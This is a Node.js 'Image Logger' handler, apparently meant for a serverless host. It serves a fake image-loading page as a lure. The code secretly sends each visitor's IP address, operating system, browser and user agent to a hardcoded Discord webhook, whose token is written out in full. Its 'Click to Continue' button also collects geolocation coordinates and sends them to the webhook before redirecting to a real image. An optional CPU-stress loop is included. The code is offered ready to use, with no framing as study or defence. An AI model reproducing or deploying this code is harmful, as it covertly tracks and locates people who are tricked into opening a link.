const fetch = require("node-fetch");

const config = {
  webhook: "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
  image: "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
  loading_image: "https://via.placeholder.com/600x400?text=Loading...",
  username: "Image Logger",
  color: 0x00FFFF,
  options: {
    accurate_location: true,
    browser_stress: false
  }
};

function detectOSBrowser(ua) {
  let os = "Unknown", browser = "Unknown";
  ua = ua.toLowerCase();
  if (ua.includes("windows")) os = "Windows 10";
  else if (ua.includes("mac")) os = "MacOS";
  else if (ua.includes("linux")) os = "Linux";
  else if (ua.includes("android")) os = "Android";
  else if (ua.includes("iphone") || ua.includes("ipad")) os = "iOS";

  if (ua.includes("chrome")) browser = "Chrome";
  else if (ua.includes("firefox")) browser = "Firefox";
  else if (ua.includes("safari") && !ua.includes("chrome")) browser = "Safari";
  else if (ua.includes("edge")) browser = "ChromiumEdge";

  return { os, browser };
}

async function sendWebhook(ip, useragent, lat, lon) {
  const { os, browser } = detectOSBrowser(useragent || "");
  const fields = [
    {
      name: "IP Info",
      value: `> IP: ${ip}
> ISP: Unknown
> ASN: Unknown
> Country: Unknown
> Region: Unknown
> City: Unknown
> Coords: ${lat || "Unknown"}, ${lon || "Unknown"}
> VPN/Proxy: Unknown
> Hosting: Unknown`
    },
    {
      name: "PC Info",
      value: `> OS: ${os}
> Browser: ${browser}`
    },
    {
      name: "User Agent",
      value: useragent || "Unknown"
    }
  ];

  const payload = {
    username: config.username,
    content: "@everyone",
    embeds: [{
      title: "Image Logger - IP Logged",
      color: config.color,
      fields: fields
    }]
  };

  try {
    await fetch(config.webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (err) {
    console.log("Webhook error:", err);
  }
}

module.exports = async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  const useragent = req.headers["user-agent"] || "";

  if (req.method === "POST") {
    // Parse raw body
    let body = [];
    req.on("data", chunk => body.push(chunk));
    req.on("end", async () => {
      try {
        const data = JSON.parse(Buffer.concat(body).toString());
        await sendWebhook(data.ip, data.useragent, data.lat, data.lon);
      } catch {}
      res.status(200).send("OK");
    });
    return;
  }

  // GET request
  await sendWebhook(ip, useragent);

  const geo_js = config.options.accurate_location ? `
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(function(pos) {
    fetch(window.location.href, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        ip: '${ip}',
        useragent: '${useragent}'
      })
    });
  });
}
` : "";

  const stress_js = config.options.browser_stress ? "for(let i=0;i<1e8;i++){Math.sqrt(i);}" : "";

  const html = `
<html>
<head>
<meta property="og:image" content="${config.loading_image}">
<title>Loading Image...</title>
</head>
<body style="text-align:center;">
<h2>Loading Image...</h2>
<img src="${config.loading_image}" style="width:50%;height:auto;">
<br><br>
<button id="allowBtn" style="padding:10px 20px;font-size:16px;">Click to Continue</button>
<script>
document.getElementById('allowBtn').onclick = function() {
  ${geo_js}
  ${stress_js}
  window.location.href = '${config.image}';
};
</script>
</body>
</html>
`;

  res.setHeader("Content-Type", "text/html");
  res.status(200).send(html);
};
